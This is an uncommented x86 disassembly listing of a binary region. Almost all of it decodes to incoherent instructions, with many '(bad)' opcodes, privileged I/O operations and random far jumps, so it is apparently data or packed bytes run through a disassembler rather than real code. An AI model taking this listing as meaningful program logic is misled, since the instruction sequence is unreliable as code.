  4128b7:	out    dx,al
  4128b8:	push   es
  4128b9:	call   DWORD PTR [ebp+0x4c154cbe]
  4128bf:	fs in  al,dx
  4128c1:	inc    eax
  4128c2:	fcomp  QWORD PTR [eax]
  4128c4:	cs leave 
  4128c6:	loopne 0x4128ca
  4128c8:	addr16 loopne 0x412924
  4128cb:	pushf  
  4128cc:	retf   
  4128cd:	and    DWORD PTR [edx+0x18cc3da9],esi
  4128d3:	dec    eax
  4128d4:	xor    BYTE PTR [ecx-0x3d],cl
  4128d7:	ds iret 
  4128d9:	jb     0x412933
  4128db:	inc    eax
  4128dc:	rcl    DWORD PTR [eax+0x7d],cl
  4128df:	fstp   DWORD PTR [ebx]
  4128e1:	xchg   DWORD PTR [ebp+0x2b3df4f2],ebx
  4128e7:	mov    ds:0x61e91980,al
  4128ec:	iret   
  4128ed:	push   esp
  4128ee:	mov    BYTE PTR [edi-0x175fa4c7],dh
  4128f4:	pop    ebx
  4128f5:	inc    BYTE PTR [ebp+ebx*8+0x495e6916]
  4128fc:	push   ss
  4128fd:	pop    edi
  4128fe:	fdivr  QWORD PTR [ecx+0x46]
  412901:	(bad)
  412906:	and    DWORD PTR [eax+0x4cca3131],0xb56d0f3b
  412910:	sahf   
  412911:	aas    
  412912:	aam    0xf1
  412914:	jbe    0x412966
  412916:	mov    esi,0xc39e968e
  41291b:	mov    esi,0xcc2400b9
  412920:	mov    esp,0x7e97e549
  412925:	jle    0x412989
  412927:	jae    0x4128cb
  412929:	cmc    
  41292a:	push   esp
  41292b:	enter  0x494e,0xc
  41292f:	sub    edi,DWORD PTR [esp+esi*2]
  412932:	icebp  
  412933:	sbb    DWORD PTR [eax+edi*4+0x76],0x32
  412938:	jle    0x412904
  41293a:	inc    ebp
  41293b:	add    eax,0x8b50a892
  412940:	aaa    
  412941:	sbb    eax,0xc3a43ff
  412946:	fstp   TBYTE PTR [ebp+0x21ccd4c4]
  41294c:	jo     0x412985
  41294e:	(bad)  
  412950:	mov    dl,0xd6
  412952:	adc    esp,DWORD PTR [edi+0x29]
  412955:	xchg   ebp,eax
  412956:	pop    ebp
  412957:	scas   al,BYTE PTR es:[edi]
  412958:	test   BYTE PTR [esi+0x4a],dh
  41295b:	stc    
  41295c:	fxtract 
  41295e:	shr    BYTE PTR [edi-0x62],0x8
  412962:	jl     0x412953
  412964:	push   cs
  412965:	inc    edx
  412966:	xlat   BYTE PTR ds:[ebx]
  412967:	add    eax,0x269ec356
  41296c:	mov    ds,WORD PTR ds:0xd6aa29ca
  412972:	idiv   DWORD PTR [ecx]
  412974:	cli    
  412975:	rcl    DWORD PTR [edi-0x21],cl
  412978:	iret   
  412979:	mov    ebx,DWORD PTR [ecx]
  41297b:	ret    
  41297c:	dec    ebx
  41297d:	call   0x3dafd088
  412982:	iret   
  412983:	sahf   
  412984:	fsubrp st(7),st
  412986:	pop    eax
  412987:	or     eax,0x53aae49b
  41298c:	pop    ecx
  41298d:	dec    ebx
  41298e:	cmp    DWORD PTR gs:[bx+di],edi
  412992:	add    BYTE PTR [ebx],dl
  412994:	mov    dh,BYTE PTR [edx-0x1f]
  412997:	dec    edi
  412998:	jle    0x41298a
  41299a:	mov    fs,WORD PTR [ebx+0xa]
  41299d:	(bad)  
  41299e:	cli    
  41299f:	xchg   esi,eax
  4129a0:	inc    esp
  4129a1:	cli    
  4129a2:	inc    edx
  4129a3:	xchg   edx,eax
  4129a4:	in     eax,dx
  4129a5:	mov    ds:0x3e8a0c77,eax
  4129aa:	xchg   ebp,edx
  4129ac:	scas   al,BYTE PTR es:[edi]
  4129ad:	outs   dx,DWORD PTR ds:[esi]
  4129ae:	add    dh,BYTE PTR [ecx-0x2]
  4129b1:	and    ah,BYTE PTR [esi-0x1e712452]
  4129b7:	cmp    DWORD PTR [ebx-0x6],esp
  4129ba:	inc    eax
  4129bb:	jecxz  0x4129ab
  4129bd:	pusha  
  4129be:	(bad)  
  4129bf:	push   ss
  4129c0:	jl     0x412a24
  4129c2:	inc    esp
  4129c3:	mov    BYTE PTR [eax],0x75
  4129c6:	mov    ecx,0xd07f2e8d
  4129cb:	sub    eax,0x18bbfd97
  4129d0:	bound  edx,QWORD PTR [esi-0x6b0de9ff]
  4129d6:	bound  edi,QWORD PTR [esi+ecx*1+0xe]
  4129da:	stos   BYTE PTR es:[edi],al
  4129db:	call   0x2e50:0xd646b4fb
  4129e2:	inc    ebx
  4129e3:	test   DWORD PTR [ecx-0x37228ca7],eax
  4129e9:	push   esi
  4129ea:	imul   ecx,DWORD PTR es:[eax],0xffffffa6
  4129ee:	fs sub eax,edx
  4129f1:	cmp    edi,ebp
  4129f3:	jle    0x412a27
  4129f5:	jp     0x412a40
  4129f7:	daa    
  4129f8:	and    BYTE PTR [edi-0x63],dh
  4129fb:	ins    BYTE PTR es:[edi],dx
  4129fc:	jge    0x4129b1
  4129fe:	jnp    0x412a2b
  412a00:	jbe    0x4129f3
  412a02:	push   ebx
  412a03:	mov    ecx,0x36e3ffcd
  412a08:	les    ecx,FWORD PTR [edi]
  412a0a:	mov    ds:0xf3accf93,al
  412a0f:	out    0x5b,eax
  412a11:	(bad)  
  412a12:	out    0x2c,al
  412a14:	sti    
  412a15:	cwde   
  412a16:	pop    ecx
  412a17:	lea    esi,[ebx+0x21]
  412a1a:	jb     0x412a78
  412a1c:	cld    
  412a1d:	daa    
  412a1e:	push   edx
  412a1f:	xor    ah,dl
  412a21:	pop    ecx
  412a22:	into   
  412a23:	or     cl,bh
  412a25:	cmp    BYTE PTR [edi],cl
  412a27:	or     BYTE PTR [ecx-0x303bcdb4],dl
  412a2d:	mov    eax,0x8f10f3af
  412a32:	jge    0x412a13
  412a34:	arpl   WORD PTR [ebp-0x30fe9128],bp
  412a3a:	into   
  412a3b:	fdivr  QWORD PTR [ebp+ebx*8-0x23]
  412a3f:	jmp    0x1810:0x52fbb15c
  412a46:	or     al,0x28
  412a48:	or     al,0x27
  412a4a:	aaa    
  412a4b:	inc    edi
  412a4c:	inc    edx
  412a4d:	test   eax,0x43645442
  412a52:	sub    DWORD PTR [eax+0xa324641],esi
  412a58:	xlat   BYTE PTR ds:[ebx]
  412a59:	or     al,0x3
  412a5b:	cdq    
  412a5c:	and    DWORD PTR [ebp+0xe],edx
  412a5f:	out    dx,al
  412a60:	test   al,0x39
  412a62:	mov    bl,0x50
  412a64:	hlt    
  412a65:	jno    0x412a90
  412a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a68:	xchg   edx,eax
  412a69:	je     0x4129f0
  412a6b:	inc    eax
  412a6c:	sbb    BYTE PTR [edi+ecx*1-0x51],dl
  412a70:	push   edx
  412a71:	jl     0x412aed
  412a73:	pop    ecx
  412a74:	je     0x412a99
  412a76:	cld    
  412a77:	je     0x412a02
  412a79:	arpl   WORD PTR [edx],si
  412a7b:	int3   
  412a7c:	mov    esi,0x8b070ea1
  412a81:	ret    0x6750
  412a84:	pop    ds
  412a85:	fidiv  DWORD PTR [edx-0x72a1b403]
  412a8b:	xchg   ebx,eax
  412a8c:	sahf   
  412a8d:	fistp  WORD PTR [eax-0x5e]
  412a90:	sub    eax,0x642e9abe
  412a95:	add    eax,0xcc4d92a1
  412a9a:	gs or  esi,edi
  412a9d:	mov    ebp,0xc714ff4d
  412aa2:	fnsave [edi]
  412aa4:	imul   ebp,DWORD PTR [edx+0x36],0x407e05a6
  412aab:	pusha  
  412aac:	push   ds
  412aad:	mov    ch,0xb3
  412aaf:	jmp    0x412a92
  412ab1:	popa   
  412ab2:	mul    BYTE PTR [edi]
  412ab4:	jge    0x412b02
  412ab6:	leave  
  412ab7:	push   ss
  412ab8:	mov    esp,0xb4bbabd5
  412abd:	inc    eax
  412abe:	and    al,al
  412ac0:	js     0x412b0f
  412ac2:	lahf   
  412ac3:	push   ecx
  412ac4:	lock push 0xfffffff7
  412ac7:	push   cs
  412ac8:	mov    DWORD PTR [esi+ecx*8-0x411a451],ecx
  412acf:	xchg   esp,eax
  412ad0:	xlat   BYTE PTR ds:[ebx]
  412ad1:	add    eax,0xe036e1f4
  412ad6:	gs push ebx
  412ad8:	sbb    BYTE PTR [eax-0x60],al
  412adb:	fnstsw WORD PTR [edx]
  412add:	pop    esp
  412ade:	xor    al,0x9d
  412ae0:	xor    al,bh
  412ae2:	sbb    al,al
  412ae4:	sahf   
  412ae5:	(bad)  
  412ae6:	adc    edx,DWORD PTR [ecx]
  412ae8:	inc    edi
  412ae9:	add    dh,BYTE PTR [ecx]
  412aeb:	loope  0x412a8d
  412aed:	xchg   ebp,eax
  412aee:	xchg   esp,eax
  412aef:	aaa    
  412af0:	jns    0x412b3c
  412af2:	push   edi
  412af3:	das    
  412af4:	mov    edi,0x51a8bd62
  412af9:	add    al,0x4a
  412afb:	and    edx,DWORD PTR [eax-0x78]
  412afe:	and    eax,0x375e50a
  412b03:	xchg   ebx,eax
  412b04:	push   esi
  412b05:	sub    DWORD PTR [ebx+0x126bfe8f],edx
  412b0b:	jnp    0x412b73
  412b0d:	mov    dl,0xb4
  412b0f:	inc    esi
  412b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b11:	mov    DWORD PTR [ebx+0x2ed39e03],ecx
  412b17:	pop    ebp
  412b18:	sbb    eax,0x506988e8
  412b1d:	jb     0x412b45
  412b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b20:	sub    DWORD PTR [esi+0x639b574c],esp
  412b26:	das    
  412b27:	xchg   ebp,eax
  412b28:	test   eax,0xbf84e323
  412b2d:	mul    DWORD PTR [edx+0x4f9b061e]
  412b33:	or     DWORD PTR [ecx+ebp*8],edx
  412b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b37:	sub    eax,0x415c2b3d
  412b3c:	lds    eax,FWORD PTR [ecx]
  412b3e:	pop    esi
  412b3f:	add    DWORD PTR [ebx+esi*2-0xe],ecx
  412b43:	jbe    0x412bba
  412b45:	inc    ebx
  412b46:	in     al,0x2b
  412b48:	and    eax,0x5f00d923
  412b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4e:	inc    ebp
  412b4f:	ret    0xbce1
  412b52:	and    edi,DWORD PTR [edi]
  412b54:	je     0x412b86
  412b56:	sbb    edx,esp
  412b58:	in     al,dx
  412b59:	shr    DWORD PTR [eax-0x29],0x2d
  412b5d:	js     0x412b3f
  412b5f:	outs   dx,BYTE PTR ds:[esi]
  412b60:	add    BYTE PTR [eax-0x4c],cl
  412b63:	add    al,0xb2
  412b65:	daa    
  412b66:	xchg   edi,eax
  412b67:	mov    edx,0x96bf69f0
  412b6c:	and    ebp,ebx
  412b6e:	(bad)  [esi+0x42]
  412b71:	scas   eax,DWORD PTR es:[edi]
  412b72:	and    cl,BYTE PTR [edx+0x44]
  412b75:	or     al,0xcd
  412b77:	sub    BYTE PTR es:[eax+0x4d],bh
  412b7b:	xchg   esi,eax
  412b7c:	repz and al,0x1e
  412b7f:	es jp  0x412b6a
  412b82:	nop
  412b83:	mov    eax,ds:0x8bab012c
  412b88:	mov    ah,0xcb
  412b8a:	and    bl,BYTE PTR [edx+0x8]
  412b8d:	ret    
  412b8e:	cmp    DWORD PTR [edi+eax*8-0x66],edi
  412b92:	jg     0x412bcb
  412b94:	nop
  412b95:	mov    ah,dh
  412b97:	clc    
  412b98:	jg     0x412b5b
  412b9a:	addr16 loopne 0x412bf2
  412b9d:	out    dx,al
  412b9e:	push   cs
  412b9f:	mov    edx,DWORD PTR [edx+0x5a65d0e8]
  412ba5:	test   BYTE PTR [ebx],bl
  412ba7:	arpl   si,ax
  412ba9:	test   ah,dl
  412bab:	and    DWORD PTR [ecx+edx*2],ecx
  412bae:	ins    BYTE PTR es:[edi],dx
  412baf:	in     al,dx
  412bb0:	arpl   WORD PTR [ecx+0x1c9024ca],bx
  412bb6:	cwde   
  412bb7:	cmp    BYTE PTR [eax-0x2e7763bb],ah
  412bbd:	adc    eax,0x9d00c81d
  412bc2:	push   edx
  412bc3:	mov    ebp,0x921765e4
  412bc8:	jp     0x412c27
  412bca:	xchg   BYTE PTR [esi],ch
  412bcc:	(bad)  
  412bcd:	cwde   
  412bce:	aas    
  412bcf:	out    0xe6,al
  412bd1:	dec    ecx
  412bd2:	iret   
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	out    dx,al
  412bd5:	fidiv  WORD PTR [eax-0x77]
  412bd8:	or     ch,dh
  412bda:	cmp    dl,0x8f
  412bdd:	test   al,0x53
  412bdf:	rcl    esi,0x34
  412be2:	push   esp
  412be3:	mov    edi,0xa786fae4
  412be8:	ret    
  412be9:	and    al,0xfa
  412beb:	pop    ebp
  412bec:	fwait
  412bed:	xchg   ebp,eax
  412bee:	(bad)  
  412bf0:	push   esp
  412bf1:	loopne 0x412c1f
  412bf3:	add    ch,bh
  412bf5:	aaa    
  412bf6:	mov    bl,0x8b
  412bf8:	test   DWORD PTR [esi+ebx*4-0x43],ebx
  412bfc:	(bad)  
  412bfd:	adc    al,0x68
  412bff:	pop    ebp
  412c00:	rcr    dl,1
  412c02:	pop    ebx
  412c03:	icebp  
  412c04:	call   0x498debff
  412c09:	push   edx
  412c0a:	add    al,0x47
  412c0c:	adc    BYTE PTR [esp+eax*8],cl
  412c0f:	and    cl,bl
  412c11:	jmp    0x82adb87b
  412c16:	cs retf 0x82
  412c1a:	pop    edi
  412c1b:	or     esp,0xbd6b31c2
  412c21:	clc    
  412c22:	and    esi,DWORD PTR [eax-0xe]
  412c25:	clc    
  412c26:	jns    0x412c40
  412c28:	lods   eax,DWORD PTR ds:[esi]
  412c29:	xchg   BYTE PTR [ecx+0x3793d097],bh
  412c2f:	cs call 0xcf120aa8
  412c35:	add    BYTE PTR [ebx],0x6b
  412c38:	outs   dx,DWORD PTR ds:[esi]
  412c39:	sub    DWORD PTR [ebx+eiz*1],eax
  412c3c:	loope  0x412bc9
  412c3e:	inc    ebx
  412c3f:	ror    BYTE PTR [ebp-0x1acf216d],1
  412c45:	popa   
  412c46:	mov    ebx,0x2ade4ec4
  412c4b:	(bad)  
  412c4c:	aad    0x2a
  412c4e:	(bad)  
  412c4f:	sti    
  412c50:	pop    ecx
  412c51:	loope  0x412c72
  412c53:	fs mov ah,0x4e
  412c56:	pop    eax
  412c57:	inc    ebp
  412c58:	jae    0x412ccb
  412c5a:	adc    eax,DWORD PTR [ecx-0x72]
  412c5d:	sbb    BYTE PTR [ecx-0x4c633af1],dl
  412c63:	out    dx,eax
  412c64:	xlat   BYTE PTR ds:[ebx]
  412c65:	rol    DWORD PTR [esi+0x4ea3b93],cl
  412c6b:	cmp    cl,BYTE PTR [edx-0x7407ba75]
  412c71:	dec    ebp
  412c72:	cld    
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xaa12d154
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    cl,dl
  412cae:	inc    BYTE PTR [ecx+ebp*1]
  412cb1:	jl     0x412d09
  412cb3:	sub    ebp,DWORD PTR [ecx+0x53]
  412cb6:	clc    
  412cb7:	ins    BYTE PTR es:[edi],dx
  412cb8:	add    DWORD PTR [edi+0x348f3dc5],ecx
  412cbe:	cmp    eax,0x9d0a7f73
  412cc3:	inc    edx
  412cc4:	xchg   ebp,eax
  412cc5:	sbb    BYTE PTR [ebp-0x43],0xc1
  412cc9:	in     eax,0x6e
  412ccb:	push   edx
  412ccc:	popa   
  412ccd:	icebp  
  412cce:	lods   al,BYTE PTR ds:[esi]
  412ccf:	xor    DWORD PTR ds:0xeea1c4d0,edi
  412cd5:	or     eax,0xe8866185
  412cda:	lods   al,BYTE PTR ds:[esi]
  412cdb:	cld    
  412cdc:	push   esp
  412cdd:	adc    dh,dl
  412cdf:	or     ah,BYTE PTR [ecx]
  412ce1:	mov    edi,0x2bd1731
  412ce6:	shr    BYTE PTR [eax],cl
  412ce8:	repnz xchg edx,eax
  412cea:	add    ebx,DWORD PTR [ebp+0x7e5d9594]
  412cf0:	xlat   BYTE PTR ds:[ebx]
  412cf1:	(bad)  
  412cf3:	add    cl,al
  412cf5:	xchg   edx,eax
  412cf6:	xor    BYTE PTR [ebx+0x70],dl
  412cf9:	xor    DWORD PTR [ebx+0x594a9b90],0xffffffd2
  412d00:	outs   dx,BYTE PTR ds:[esi]
  412d01:	ss inc ebp
  412d03:	ret    0xa1af
  412d06:	into   
  412d07:	outs   dx,DWORD PTR ds:[esi]
  412d08:	mov    dh,0xc6
  412d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d0b:	or     al,BYTE PTR [ebx-0x3daae5f]
  412d11:	popa   
  412d12:	adc    al,0x4f
  412d14:	popa   
  412d15:	adc    ebx,DWORD PTR [edx+eiz*1+0x4bca147d]
  412d1c:	arpl   cx,bx
  412d1e:	inc    ebp
  412d1f:	xchg   edi,eax
  412d20:	sub    eax,0x2e443abe
  412d25:	push   cs
  412d26:	aad    0x1c
  412d28:	cmc    
  412d29:	iret   
  412d2a:	not    BYTE PTR [ebp+0x3b795716]
  412d30:	cs jnp 0x412d2e
  412d33:	(bad)  
  412d34:	adc    al,0x49
  412d36:	push   0xffffffc1
  412d38:	inc    ecx
  412d39:	jmp    FWORD PTR [ebx+edx*1]
  412d3c:	or     eax,0x1e0862e7
  412d41:	dec    ebp
  412d42:	inc    edi
  412d43:	sbb    dh,0x2f
  412d46:	addr16 push eax
  412d48:	push   es
  412d49:	sar    BYTE PTR [edi-0x72],1
  412d4c:	ins    DWORD PTR es:[edi],dx
  412d4d:	rcl    BYTE PTR [esi+0x41],cl
  412d50:	mov    es,ebx
  412d52:	push   ecx
  412d53:	repnz stos DWORD PTR es:[edi],eax
  412d55:	dec    edi
  412d56:	scas   al,BYTE PTR es:[edi]
  412d57:	dec    edi
  412d58:	sub    BYTE PTR [ebx],dl
  412d5a:	scas   al,BYTE PTR es:[edi]
  412d5b:	cs into 
  412d5d:	ins    BYTE PTR es:[edi],dx
  412d5e:	mov    dl,0xd3
  412d60:	in     eax,0x9f
  412d62:	add    BYTE PTR [edi+0x29698da1],bl
  412d68:	ins    BYTE PTR es:[edi],dx
  412d69:	cwde   
  412d6a:	aas    
  412d6b:	cwde   
  412d6c:	mov    eax,0xfa74744c
  412d71:	mov    ds:0x13016d63,eax
  412d76:	scas   al,BYTE PTR es:[edi]
  412d77:	neg    DWORD PTR ds:0xcf699e67
  412d7d:	pusha  
  412d7e:	adc    DWORD PTR [esi],edi
  412d80:	fdiv   DWORD PTR [edi-0x108a912e]
  412d86:	mov    eax,ds:0xeb62f42
  412d8b:	icebp  
  412d8c:	xor    eax,0x92c3587b
  412d91:	dec    ebp
  412d92:	aas    
  412d93:	adc    ebx,DWORD PTR [edi-0x4b]
  412d96:	in     eax,dx
  412d97:	(bad)  
  412d98:	adc    al,0x9f
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	std    
  412d9c:	ins    DWORD PTR es:[edi],dx
  412d9d:	in     al,dx
  412d9e:	inc    ecx
  412d9f:	fidivr WORD PTR [eax]
  412da1:	jmp    0x412d8b
  412da3:	mov    eax,ds:0x231e9c15
  412da8:	jecxz  0x412db3
  412daa:	or     dl,BYTE PTR [ebp-0x3d]
  412dad:	scas   eax,DWORD PTR es:[edi]
  412dae:	leave  
  412daf:	mov    ds:0xf9aa17ec,eax
  412db4:	jp     0x412d88
  412db6:	(bad)  
  412db7:	stos   DWORD PTR es:[edi],eax
  412db8:	jnp    0x412db5
  412dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dbb:	outs   dx,BYTE PTR es:[esi]
  412dbd:	xor    esp,ebp
  412dbf:	imul   esp,DWORD PTR [ebx-0x6b],0x18570ab5
  412dc6:	js     0x412df5
  412dc8:	xor    al,BYTE PTR [edi+eax*4+0x4e30d597]
  412dcf:	cs jns 0x412dde
  412dd2:	iret   
  412dd3:	sub    al,0x7c
  412dd5:	xlat   BYTE PTR gs:[ebx]
  412dd7:	sub    esi,DWORD PTR [edi-0x49]
  412dda:	ret    
  412ddb:	mov    es,WORD PTR [esi+0x72]
  412dde:	sti    
  412ddf:	test   al,0x53
  412de1:	fidiv  DWORD PTR [ebp+edx*2+0x6e]
  412de5:	(bad)  
  412de6:	sub    al,0xab
  412de8:	sub    BYTE PTR [ebp+0x6b],bh
  412deb:	push   0xef43444c
  412df0:	test   DWORD PTR ss:[esi-0x44],0xf43db102
  412df8:	sbb    BYTE PTR [ebx],0xdf
  412dfb:	cli    
  412dfc:	cli    
  412dfd:	int    0xae
  412dff:	das    
  412e00:	retf   0x345d
  412e03:	jl     0x412e1b
  412e05:	and    BYTE PTR [edx-0x78],ah
  412e08:	add    cx,WORD PTR [edi+0x38]
  412e0c:	mov    WORD PTR [ecx+0x64],ds
  412e0f:	pop    esi
  412e10:	lds    esi,FWORD PTR [edi+esi*8]
  412e13:	jae    0x412e3f
  412e15:	or     cl,BYTE PTR [edx+eiz*8+0x64ecae55]
  412e1c:	cs adc cl,cl
  412e1f:	cmp    al,BYTE PTR [esi+0x18a9e4e8]
  412e25:	mov    bl,0xde
  412e27:	(bad)  
  412e28:	xchg   edx,eax
  412e29:	fyl2x  
  412e2b:	stc    
  412e2c:	adc    eax,0xac22af30
  412e31:	repnz sub BYTE PTR [ecx+0x65a1377c],0xa0
  412e39:	mov    esp,0xc9aacebf
  412e3e:	ret    0x2f90
  412e41:	inc    ebp
  412e42:	mov    eax,es:0xa09e385d
  412e48:	(bad)  
  412e49:	in     eax,0x74
  412e4b:	jb     0x412eb5
  412e4d:	pop    edi
  412e4e:	shl    BYTE PTR [ebx-0x19c80c82],cl
  412e54:	mov    ebx,0x206b0e1b
  412e59:	(bad)  
  412e5a:	pop    eax
  412e5b:	push   ss
  412e5c:	clc    
  412e5d:	adc    eax,0x5f48bae9
  412e62:	int3   
  412e63:	adc    BYTE PTR [ebp-0x4b],dh
  412e66:	jae    0x412e61
  412e68:	push   edx
  412e69:	adc    bl,BYTE PTR [esi]
  412e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e6c:	mov    edx,0x49932cd5
  412e71:	aam    0xbd
  412e73:	div    BYTE PTR [ecx-0x29]
  412e76:	cs mov esi,0x2fa888ec
  412e7c:	sahf   
  412e7d:	cmp    edx,ecx
  412e7f:	mov    edx,0x267d09f
  412e84:	push   ebp
  412e85:	mov    dl,0x2a
  412e87:	adc    eax,0xf5d72410
  412e8c:	inc    ecx
  412e8d:	cs imul eax,ecx,0xdc69d410
  412e94:	and    al,0xcf
  412e96:	push   esi
  412e97:	mov    ebx,0x9e2d04cb
  412e9c:	xor    dl,BYTE PTR ds:0xe8aa222e
  412ea2:	loopne 0x412e60
  412ea4:	popa   
  412ea5:	jnp    0x412f00
  412ea7:	enter  0xba54,0x3a
  412eab:	loop   0x412eae
  412ead:	jp     0x412e3e
  412eaf:	in     al,0xf6
  412eb1:	adc    al,0x14
  412eb3:	lahf   
  412eb4:	rcl    DWORD PTR [edi+0x4638e702],1
  412eba:	stos   BYTE PTR es:[edi],al
  412ebb:	popa   
  412ebc:	sti    
  412ebd:	sub    eax,0x1b5a756a
  412ec2:	fmul   DWORD PTR [esi+0x57f79e6c]
  412ec8:	xor    edi,ecx
  412eca:	ins    DWORD PTR es:[edi],dx
  412ecb:	sub    al,0xd9
  412ecd:	or     eax,0x55d25ba5
  412ed2:	mov    bh,0xd0
  412ed4:	imul   esi,DWORD PTR [esi+0x78d96931],0x2f4ed087
  412ede:	daa    
  412edf:	std    
  412ee0:	xor    eax,0x7ae35fd2
  412ee5:	pop    ds
  412ee6:	sub    DWORD PTR [eax-0x592e220b],edx
  412eec:	jnp    0x412ec3
  412eee:	cld    
  412eef:	cmp    dl,dh
  412ef1:	arpl   WORD PTR [ebx+0x9],di
  412ef4:	idiv   ch
  412ef6:	por    mm5,QWORD PTR [ecx]
  412ef9:	ret    0xadca
  412efc:	push   esp
  412efd:	(bad)  
  412efe:	out    0x7f,al
  412f00:	out    dx,eax
  412f01:	ja     0x412eb9
  412f03:	push   ds
  412f04:	sbb    al,0xc7
  412f06:	xchg   ebp,eax
  412f07:	neg    DWORD PTR [edx-0x21]
  412f0a:	call   0xcb6f:0x72f6ae1a
  412f11:	mul    DWORD PTR [ebx-0x270c866d]
  412f17:	imul   ebp,DWORD PTR [bx],0x4cd828a6
  412f1e:	push   eax
  412f1f:	sbb    BYTE PTR [ecx-0x26],dh
  412f22:	push   ebp
  412f23:	jmp    0x824e:0x7622b151
  412f2a:	dec    esp
  412f2b:	fnstcw WORD PTR [ebp-0x162a6985]
  412f31:	(bad)  
  412f32:	outs   dx,BYTE PTR ds:[esi]
  412f33:	and    cl,dl
  412f35:	jg     0x412f6d
  412f37:	int3   
  412f38:	jmp    0x9e07:0x327e5984
  412f3f:	dec    edx
  412f40:	sbb    bh,BYTE PTR [ebp+0x23763011]
  412f46:	arpl   bx,cx
  412f48:	into   
  412f49:	push   esp
  412f4a:	mov    al,0x8b
  412f4c:	jmp    0x412f4e
  412f4e:	xchg   edx,eax
  412f4f:	loop   0x412f11
  412f51:	(bad)  
  412f52:	and    esp,ebp
  412f54:	lods   eax,DWORD PTR ds:[esi]
  412f55:	jb     0x412fae
  412f57:	jo     0x412f0a
  412f59:	push   edi
  412f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f5b:	sub    dl,BYTE PTR [edx]
  412f5d:	mov    al,ds:0x972d727f
  412f62:	es cmp eax,0x2d0b3f19
  412f68:	test   eax,0x259f077c
  412f6d:	lock inc esp
  412f6f:	mov    dh,0x3d
  412f71:	shl    bl,cl
  412f73:	mov    DWORD PTR [ecx-0x8],eax
  412f76:	(bad)  
  412f77:	mov    bh,0xe
  412f79:	mov    ah,0x3f
  412f7b:	(bad)  
  412f7d:	(bad)  
  412f7e:	les    esi,FWORD PTR [edx-0x15afea6b]
  412f84:	sar    DWORD PTR [ebx+0x56],cl
  412f87:	arpl   WORD PTR [esi+ecx*4],bx
  412f8a:	inc    esi
  412f8b:	mov    bh,0x79
  412f8d:	xor    DWORD PTR [esi+0x5d],0xffffffab
  412f91:	cmp    eax,0x40cda632
  412f96:	xchg   ebp,eax
  412f97:	inc    eax
  412f98:	mov    edi,0x152b7d12
  412f9d:	xchg   esi,eax
  412f9e:	popa   
  412f9f:	jnp    0x412f6c
  412fa1:	jmp    0x412f3f
  412fa3:	add    al,0xb5
  412fa5:	mov    esi,0xb37be8e5
  412faa:	stc    
  412fab:	mov    edi,0xda34ef29
  412fb0:	ins    DWORD PTR es:[edi],dx
  412fb1:	lock jb 0x412f52
  412fb4:	pop    edx
  412fb5:	mov    esp,0xbffc8520
  412fba:	call   0x7a74:0x1d1810d3
  412fc1:	loop   0x412fb1
  412fc3:	cmc    
  412fc4:	push   ecx
  412fc5:	mov    cl,BYTE PTR [edx-0x77]
  412fc8:	push   esi
  412fc9:	xor    eax,DWORD PTR [ecx]
  412fcb:	sysexit 
  412fcd:	or     eax,0x4b97ebb1
  412fd2:	sti    
  412fd3:	xor    DWORD PTR [edi],edx
  412fd5:	sub    edx,esp
  412fd7:	popf   
  412fd8:	imul   ecx,DWORD PTR [edx],0x942f5f40
  412fde:	push   eax
  412fdf:	xlat   BYTE PTR es:[ebx]
  412fe1:	xchg   ebx,eax
  412fe2:	cmp    eax,0xcf3aa637
  412fe7:	add    ecx,DWORD PTR [edx]
  412fe9:	out    dx,eax
  412fea:	retf   
  412feb:	xchg   edi,eax
  412fec:	add    al,0xb6
  412fee:	add    ch,bh
  412ff0:	sub    BYTE PTR [eax],ch
  412ff2:	ja     0x412ff6
  412ff4:	retf   0x2a9b
  412ff7:	mov    ebx,0x875962d6
  412ffc:	xor    eax,0x39f70ba
  413001:	sbb    eax,0xce8973de
  413006:	pop    ss
  413007:	imul   esp,eax,0x7a443866
  41300d:	fwait
  41300e:	push   ecx
  41300f:	xchg   DWORD PTR [edx],esi
  413011:	or     DWORD PTR [esp+eax*2-0x543377d7],eax
  413018:	es push cs
  41301a:	ins    DWORD PTR es:[edi],dx
  41301b:	cmp    edx,ebx
  41301d:	jle    0x41307d
  41301f:	(bad)  
  413020:	pop    ds
  413021:	push   ebp
  413022:	push   edx
  413023:	fsub   QWORD PTR [edx-0x42c686b3]
  413029:	cmp    al,0x2d
  41302b:	dec    ebx
  41302c:	aad    0x79
  41302e:	retf   
  41302f:	lods   al,BYTE PTR ds:[esi]
  413030:	ss jb  0x412ff6
  413033:	fiadd  WORD PTR [ebp+0x5acc6395]
  413039:	push   es
  41303a:	sti    
  41303b:	cwde   
  41303c:	xlat   BYTE PTR ds:[ebx]
  41303d:	cmp    DWORD PTR [esi-0x7f02f95e],0xffffffea
  413044:	jno    0x413086
  413046:	xor    al,cl
  413048:	outs   dx,DWORD PTR ds:[esi]
  413049:	(bad)  
  41304a:	or     esp,DWORD PTR [ecx-0x11]
  41304d:	push   eax
  41304e:	or     edi,edi
  413050:	in     eax,dx
  413051:	inc    edx
  413052:	or     DWORD PTR [ecx+0x6f],0x48
  413056:	call   0x603a:0x8a1540de
  41305d:	push   ecx
